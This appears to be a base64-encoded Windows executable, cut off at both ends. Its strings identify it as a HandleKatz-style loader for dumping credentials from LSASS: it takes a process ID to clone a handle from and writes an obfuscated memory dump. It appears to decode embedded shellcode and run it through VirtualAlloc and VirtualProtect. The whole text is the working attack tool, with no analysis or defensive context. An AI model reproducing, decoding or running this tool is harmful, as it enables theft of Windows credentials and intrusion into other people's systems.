1NJMUVKRUpJaVVRa2VFaU5SQ1JNU0ltRUpJQUFBQUJJalVRa1ZtYUpWQ1EyWm9sTUpFQm1SSWxFSkVwbVJJbE1KRlJtUklsVUpGNU1pV1FrWUVpSmhDU0lBQUFBU01lRUpKQUFBQUFBQUFBQVRJbmgvNVBJQUFBQVFZbkZTSmhJT2ZCelBVaUo4a2dwd2tpTkRGZE1pZUwva3lnQkFBQ0Z3SFVaU0lIRXFBQUFBRVNKNkZ0ZVgxMUJYRUZkdzJZUEgwUUFBRXlMWlFoSWc4VUlUWVhrZGJCRk1lM3IxWkNRa0pDUWtFRldRVlZCVkVtSjFGVkVpY1ZYUkluUFZraUp6bE5JZyt3Z1NJdFpXRWlMaENTQUFBQUFTSVhiZEcyTFVXQkVpMGxrUkRuS2NqWkhqU3dKVEl1d21BQUFBRVNKYVdUL2tJZ0FBQUJGaWVsSmlkZ3gwa2lKd1VuQjRRUkIvOVpJaWNOSWlVWllTSVhiZEZ1TFZtQkJpZENEd2dGSndlQUVUQUhEVElramlXc0lpWHNNaVZaZ1NJUEVJRnRlWDExQlhFRmRRVjdERHg4QVNJdVlnQUFBQU1kQlpDQUFBQUQva0lnQUFBQkJ1QUFDQUFBeDBraUp3Zi9UU0luRFNJbEdXRWlGMjNXbFNNZEdZQUFBQUFCSWc4UWdXMTVmWFVGY1FWMUJYc09Ra0pDUVZWZFdVMGhqYVR4SUFjMkx2WWdBQUFCSUFjOUVpMDhnaTNjWVNRSEpoZlowVm9uVFNZbkxSVEhTZ2ZORVEwSkJRWXNCdVFVVkFBQk1BZGhNalVBQkQ3WUFoTUIwSVdZdUR4K0VBQUFBQUFDSnlzSGlCUUhRQWNGTWljQkpnOEFCRDdZQWhNQjE2VG5aZEJSSmc4SUJTWVBCQkV3NTFuVzRNY0JiWGw5ZHc0dFhKRXVOREZPTFJ4d1B0eFFSU1kwVWs0c0VBa3dCMkVnNXgzZmVpNVdNQUFBQVNBSFhTRG40ZDlCYlNJbkJYbDlkNlJyMS8vK1FrSkNRa0pDUWtKQ1FRVlJCdVVBQUFBQkppY3hYVmt5SnhsTklpZE5JZyt4NFNNZEVKQ0FBQUFBQVRJMUVKRERvWmRqLy8waGpWQ1JzU1lud1RJbmhTTWRFSkNBQUFBQUFRYmtJQVFBQWljZElBZHJvUWRqLy8yYUJmQ1F3VFZwMUJBbkhkQlF4d0VpRHhIaGJYbDlCWE1NUEg0UUFBQUFBQURIQWdUNVFSUUFBRDVUQTYrR1FrSkJCVlVtSnpVaUowVUZVVTBpSjAwaUQ3RkRvMmZqLy8waUZ3SFEwU1luRVNZblpUWW5vTWRKSWljSG80ZWYvLzB5SjRVRzRBSUFBQURIUy8xTTRTSVBFVUxnQkFBQUFXMEZjUVYzRER4OUFBRWk0V3kxZElFWmhhV3pIUkNSQWJHVnpDa3lKNlVpNlpXUWdkRzhnWjJWSWlVUWtJRWk0ZENCaElHeHBjM1JJaVZRa0tFaTZJRzltSUdoaGJtUklpVlFrT0VpTlZDUWdTSWxFSkRER1JDUkVBUDlUQ0VpRHhGQXh3RnRCWEVGZHcxTzZ6OC9ZRkVpSnk3a3hyUUl4U0lQc0lPaHA5di8vdWlmby9aTzVNYTBDTVVpSkEraFg5di8vdWs3b2hwTzVNYTBDTVVpSlF3am9SUGIvLzdxSCs5cTV1WmZzVzVoSWlVTVE2REgyLy8rNnZvYlVxcmt4clFJeFNJbERHT2dlOXYvL3VrT0pNbm01TWEwQ01VaUpReURvQy9iLy83cTFoTVFJdVRHdEFqRklpVU1vNlBqMS8vKzZhb3pOSjdreHJRSXhTSWxETU9qbDlmLy91dE5NYm5tNU1hMENNVWlKUXpqbzB2WC8vN3B4ZmU5T3VXUFhUK1pJaVVOSTZMLzEvLys2ZkdIMFRybGoxMC9tU0lsRFVPaXM5Zi8vdWc0S0pLVzVNYTBDTVVpSlExam9tZlgvLzdvdHh4RmZ1VEd0QWpGSWlVTmc2SWIxLy8rNk1SL1pucmxqMTAvbVNJbERhT2h6OWYvL3V2U3ZmaWU1TWEwQ01VaUpRM0RvWVBYLy83cEtKTDlldVRHdEFqRklpVU40NkUzMS8vKzZSazRhaDdreHJRSXhTSW1EZ0FBQUFPZzM5Zi8vdW9IUUNuYTVNYTBDTVVpSmc0Z0FBQURvSWZYLy83cGhnbk5mdVRHdEFqRklpWU9RQUFBQTZBdjEvLys2dGlpdEVya3hyUUl4U0ltRG1BQUFBT2oxOVAvL3VyK3ovUjY1TWEwQ01VaUpnNkFBQUFEbzMvVC8vN3F5ckVyQ3VUR3RBakZJaVlPb0FBQUE2TW4wLy8rNmVJMnNjYmt4clFJeFNJbURzQUFBQU9pejlQLy91a29jQ0lPNU1hMENNVWlKZzdnQUFBRG9uZlQvLzdwazZJYVR1VEd0QWpGSWlZUEFBQUFBNklmMC8vKzZXL2h6anJreHJRSXhTSW1EeUFBQUFPaHg5UC8vdXR1bzBaYTVNYTBDTVVpSmc5QUFBQURvVy9ULy83cUxlamhNdVRHdEFqRklpWVBZQUFBQTZFWDAvLys2elFWQlVMbTdEczcxU0ltRDRBQUFBT2d2OVAvL3VpcTZOcFM1dXc3TzlVaUpnK2dBQUFEb0dmVC8vN29ZMnljNXVic096dlZJaVlQd0FBQUE2QVAwLy8rNnFhajlrN2t4clFJeFNJbUQrQUFBQU9qdDgvLy91aVFLSktXNU1hMENNVWlKZ3dBQkFBRG8xL1AvLzdyVzNKemt1VEd0QWpGSWlZTUlBUUFBNk1Iei8vKzZ0VVQxdDdreHJRSXhTSW1ERUFFQUFPaXI4Ly8vdXRxY3pidTVNYTBDTVVpSmd4Z0JBQURvbGZQLy83cXZudjJUdVRHdEFqRklpWU1nQVFBQTZIL3ovLys2UlozOWs3a3hyUUl4U0lsRFFPaHM4Ly8vdXNBdDdQcTVEY2xpSmtpSmd5Z0JBQURvVnZQLy8waUR1eEFCQUFBQVNJbURNQUVBQUErRUVRSUFBRWlEdXhnQkFBQUFENFFyQWdBQVNJTzdJQUVBQUFBUGhFVUNBQUJJZzN0Z0FBK0VZZ0lBQUVpRGUyZ0FENFIvQWdBQVNJTzdDQUVBQUFBUGhKa0NBQUJJZzNzSUFBK0V2Z0VBQUVpRGV4QUFENFN6QVFBQVNJTjdHQUFQaEtnQkFBQklnM3NnQUErRW5RRUFBRWlEZXlnQUQ0U1NBUUFBU0lON01BQVBoSWNCQUFCSWczczRBQStFZkFFQUFFaURlMGdBRDRSeEFRQUFTSU43VUFBUGhHWUJBQUJJZzN0WUFBK0VXd0VBQUVpRGUyQUFENFJRQVFBQVNJTjdhQUFQaEVVQkFBQklnM3R3QUErRU9nRUFBRWlEZTNnQUQ0UXZBUUFBU0lPN2dBQUFBQUFQaENFQkFBQklnN3VJQUFBQUFBK0VFd0VBQUVpRHU1QUFBQUFBRDRRRkFRQUFTSU83bUFBQUFBQVBoUGNBQUFCSWc3dWdBQUFBQUErRTZRQUFBRWlEdTZnQUFBQUFENFRiQUFBQVNJTzdzQUFBQUFBUGhNMEFBQUJJZzd1NEFBQUFBQStFdndBQUFFaUR1OEFBQUFBQUQ0U3hBQUFBU0lPN3lBQUFBQUFQaEtNQUFBQklnN3ZRQUFBQUFBK0VsUUFBQUVpRHU5Z0FBQUFBRDRTSEFBQUFTSU83NEFBQUFBQjBmVWlEdStnQUFBQUFkSE5JZzd2d0FBQUFBSFJwU0lPNytBQUFBQUIwWDBpRHV3QUJBQUFBZEZWSWc3c0lBUUFBQUhSTFNJTzdFQUVBQUFCMFFVaUR1eGdCQUFBQWREZElnN3NnQVFBQUFIUXRTSU43UUFCMEpraUR1eWdCQUFBQWRCeElnN3N3QVFBQUFIUVNNY0JJZ3pzQUQ1WEE2d2tQSDRBQUFBQUFNY0JJZzhRZ1c4TzYxdHljNUxtSUp2Z0E2Q0h4Ly85SWc3c1lBUUFBQUVpSmd4QUJBQUFQaGRuOS8vOFBIMEFBdXJWRTliZTVpQ2I0QU9qNThQLy9TSU83SUFFQUFBQklpWU1ZQVFBQUQ0Vy8vZi8vRHg5QUFMcmFuTTI3dVlnbStBRG8wZkQvLzBpRGUyQUFTSW1ESUFFQUFBK0ZwZjMvL3c4ZmdBQUFBQUM2RGdva3BibUlKdmdBNktudy8vOUlnM3RvQUVpSlEyQVBoWXY5Ly85bUxnOGZoQUFBQUFBQXVpM0hFVis1aUNiNEFPaUI4UC8vU0lPN0NBRUFBQUJJaVVOb0Q0VnUvZi8vRHgrQUFBQUFBTG9rQ2lTbHVZZ20rQURvV2ZELy8waUpnd2dCQUFEcFRQMy8vNUNRa0pDUWtKQ1FrSkNRa0pCQlZMb29BQUFBUlRIa1ZsTklpY3RJeDhILy8vLy9TSVBzY0VqSFJDUTRBQUFBQUV5TlJDUTRTTWRFSkVBQUFBQUFTTWRFSkVnQUFBQUE2RW5MLy8rRndIVldNY25IUkNSQUFRQUFBRWk2Y21sMmFXeGxaMlZJdUZObFJHVmlkV2RRU0lsVUpGaElqWFFrUUVpTlZDUlF4MFFrVEFJQUFBQk1qVVFrUkVpSlJDUlF4a1FrWUFEL2t6QUJBQUNGd0hVWFNJdE1KRGovVXloSWc4UndSSW5nVzE1QlhNTVBId0JJaTB3a09FRzVFQUFBQUVtSjhESFNTTWRFSkNnQUFBQUFTTWRFSkNBQUFBQUE2Q0hGLy85SWkwd2tPSVhBZFJqL1V5aEJ2QUVBQUFCSWc4UndSSW5nVzE1QlhNTVBId0QvVXloSWc4UndSSW5nVzE1QlhNT1F1QUVBQUFERGtKQ1FrSkNRa0pDUWtQLy8vLy8vLy8vL0FBQUFBQUFBQUFELy8vLy8vLy8vL3dBQUFBQUFBQUFBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwf0AAAAAAAAAAAAAAAAAA//////////8AAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAA/////wAAAAAAAAAAAAAAAEAAAADDv///wD8AAAEAAAAAAAAADgAAAAAAAAAAAAAAwBFBAAAAAAAAAAAAAAAAAPB8QAAAAAAAAAAAAAAAAAAQfUAAAAAAACB9QAAAAAAAoH1AAAAAAAAwfUAAAAAAAAB+QAAAAAAAAAAAAAAAAAAQfkypdIFJlY29uIG9ubHk6ICVkCgBbKl0gUGF0aCBkbXA6ICVzCgBbKl0gUGlkIHRvIGNsb25lIGZyb206ICVkCgAAAAAAAAAAWypdIEhhbmRsZUthdHogcmV0dXJuIHZhbHVlOiAlZAoAWypdIEhhbmRsZUthdHogb3V0cHV0OgoKACVzCgAtLXJlY29uAC0tcGlkAC0tb3V0ZmlsZQAAACVzIHstLXJlY29ufSB7LS1waWQ6W3BpZCB0byBjbG9uZSBmcm9tXSAtLW91dGZpbGU6W3BhdGggdG8gb2JmdXNjYXRlZCBkbXBdCgAAAAAAAAAAAAAAAAAAAAAAAAAAAOAZQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEBBAAAAAAAIQEEAAAAAAJwQQQAAAAAAQDBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFVua25vd24gZXJyb3IAAABBcmd1bWVudCBkb21haW4gZXJyb3IgKERPTUFJTikAAE92ZXJmbG93IHJhbmdlIGVycm9yIChPVkVSRkxPVykAUGFydGlhbCBsb3NzIG9mIHNpZ25pZmljYW5jZSAoUExPU1MpAAAAAFRvdGFsIGxvc3Mgb2Ygc2lnbmlmaWNhbmNlIChUTE9TUykAAAAAAABUaGUgcmVzdWx0IGlzIHRvbyBzbWFsbCB0byBiZSByZXByZXNlbnRlZCAoVU5ERVJGTE9XKQBBcmd1bWVudCBzaW5ndWxhcml0eSAoU0lHTikAAAAAAAAAX21hdGhlcnIoKTogJXMgaW4gJXMoJWcsICVnKSAgKHJldHZhbD0lZykKAADoOP//nDj//zQ4//+8OP//zDj//9w4//+sOP//TWluZ3ctdzY0IHJ1bnRpbWUgZmFpbHVyZToKAAAAAABBZGRyZXNzICVwIGhhcyBubyBpbWFnZS1zZWN0aW9uACAgVmlydHVhbFF1ZXJ5IGZhaWxlZCBmb3IgJWQgYnl0ZXMgYXQgYWRkcmVzcyAlcAAAAAAAAAAAICBWaXJ0dWFsUHJvdGVjdCBmYWlsZWQgd2l0aCBjb2RlIDB4JXgAACAgVW5rbm93biBwc2V1ZG8gcmVsb2NhdGlvbiBwcm90b2NvbCB2ZXJzaW9uICVkLgoAAAAAAAAAICBVbmtub3duIHBzZXVkbyByZWxvY2F0aW9uIGJpdCBzaXplICVkLgoAAAAAAAAAAAAAAAAAAACwPf//sD3//7A9//+wPf//sD3//xg9//+wPf//4D3//xg9//9DPf//AAAAAAAAAAAobnVsbCkATmFOAEluZgAAKABuAHUAbABsACkAAAAAALJo//+4Yv//uGL//8xo//+4Yv//1Gf//7hi///rZ///uGL//7hi//9gaP//nGj//7hi//9nZv//gGb//7hi//+cZv//uGL//7hi//+4Yv//uGL//7hi//+4Yv//uGL//7hi//+4Yv//uGL//7hi//+4Yv//uGL//7hi//+4Yv//uGL//7xm//+4Yv//9Gb//7hi//8sZ///ZGf//5xn//+4Yv//ImX//7hi//+4Yv//UGb//7hi//+4Yv//uGL//7hi//+4Yv//uGL//+lo//+4Yv//uGL//7hi//+4Yv//MGP//7hi//+4Yv//uGL//7hi//+4Yv//uGL//7hi//+4Yv//qmT//7hi//8nZP//oGP//0pl///gZf//GGb//4Jl//+gY///iGP//7hi//+iZf//wmX//2xk//8wY///4mT//7hi//+4Yv//+2P//4hj//8wY///uGL//7hi//8wY///uGL//4hj//8AAAAASW5maW5pdHkATmFOADAAAAAAAAAAAPg/YUNvY6eH0j+zyGCLKIrGP/t5n1ATRNM/BPp9nRYt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QAAAAAA5CYBAAAAAADwJgEAAAAAAPomAQAAAAAABCcBAAAAAAAOJwEAAAAAABonAQAAAAAAAAAAAAAAAADkAENyeXB0U3RyaW5nVG9CaW5hcnlBAAAbAURlbGV0ZUNyaXRpY2FsU2VjdGlvbgA/AUVudGVyQ3JpdGljYWxTZWN0aW9uAAB2AkdldExhc3RFcnJvcgAA5wJHZXRTdGFydHVwSW5mb0EAfANJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uAJcDSXNEQkNTTGVhZEJ5dGVFeAAA2ANMZWF2ZUNyaXRpY2FsU2VjdGlvbgAADARNdWx0aUJ5dGVUb1dpZGVDaGFyAHIFU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAIIFU2xlZXAApQVUbHNHZXRWYWx1ZQDOBVZpcnR1YWxBbGxvYwAA1AVWaXJ0dWFsUHJvdGVjdAAA1gVWaXJ0dWFsUXVlcnkAAAsGV2lkZUNoYXJUb011bHRpQnl0ZQBLBmxzdHJsZW5BAAA4AF9fQ19zcGVjaWZpY19oYW5kbGVyAABAAF9fX2xjX2NvZGVwYWdlX2Z1bmMAQwBfX19tYl9jdXJfbWF4X2Z1bmMAAFIAX19nZXRtYWluYXJncwBTAF9faW5pdGVudgBUAF9faW9iX2Z1bmMAAFsAX19sY29udl9pbml0AABhAF9fc2V0X2FwcF90eXBlAABjAF9fc2V0dXNlcm1hdGhlcnIAAHIAX2FjbWRsbgB5AF9hbXNnX2V4aXQAAIsAX2NleGl0AACXAF9jb21tb2RlAAC+AF9lcnJubwAA3ABfZm1vZGUAAB0BX2luaXR0ZXJtAIMBX2xvY2sAKQJfb25leGl0AMoCX3VubG9jawCKA2Fib3J0AJcDYXRvaQAAmwNjYWxsb2MAAKgDZXhpdAAAvANmcHJpbnRmAL4DZnB1dGMAwwNmcmVlAADQA2Z3cml0ZQAA+QNsb2NhbGVjb252AAD/A21hbGxvYwAABwRtZW1jcHkAAAkEbWVtc2V0AAAnBHNpZ25hbAAANgRzdHJjaHIAADwEc3RyZXJyb3IAAD4Ec3RybGVuAABBBHN0cm5jbXAARwRzdHJzdHIAAGMEdmZwcmludGYAAH0Ed2NzbGVuAAAAIAEAQ1JZUFQzMi5kbGwAFCABABQgAQAUIAEAFCABABQgAQAUIAEAFCABABQgAQAUIAEAFCABABQgAQAUIAEAFCABABQgAQAUIAEAFCABAEtFUk5FTDMyLmRsbAAAAAAoIAEAKCABACggAQAoIAEAKCABACggAQAoIAEAKCABACggAQAoIAEAKCABACggAQAoI